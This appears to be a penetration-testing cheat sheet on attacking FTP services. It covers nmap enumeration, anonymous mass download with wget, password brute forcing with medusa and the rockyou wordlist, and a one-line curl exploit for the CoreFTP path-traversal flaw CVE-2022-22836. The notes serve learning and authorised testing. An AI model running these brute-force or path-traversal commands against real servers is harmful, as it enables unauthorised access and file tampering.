### Enumeration
``` bash
sudo nmap -sC -sV -p 21 <IP>

ftp <ip> [<port>]
```

- [FTP Commands](https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/)
	- `ls -R` to list files recursively
	- On the server, use `status` to get an overview of the server's settings
	- `debug` and `trace` are also usefull for showing more information.
	-  Download All Available Files
		- `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10`
	- Upload a file
		- `put somefile.txt`
	- Connect to an FTP server that uses TLS/SSL
		- `openssl s_client -connect [target]:21 -starttls ftp`

- [FTP Status Codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)

### Brute Forcing
- Can be done via hydra or [medusa](https://github.com/jmk-foofus/medusa)
- Most applications prevent this kind of attack.
	- Password Spraying is more effective
``` bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -M ftp -h <IP>  
```

## Latest Vulnerabilities
- **CoreFTP < build 727**
- Â [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)
- Authenticated Path traversal/arbitrary write vulnerability

#### Concept of Attack
- CoreFTP uses a HTTP `POST` request to upload files. However the service allows an HTTP `PUT` request which we can use to write content to files.
- The [exploit](https://www.exploit-db.com/exploits/50652) is based on a single cURL command
``` bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "payload" --path-as-is https://<IP>/../../../../../../whoops
```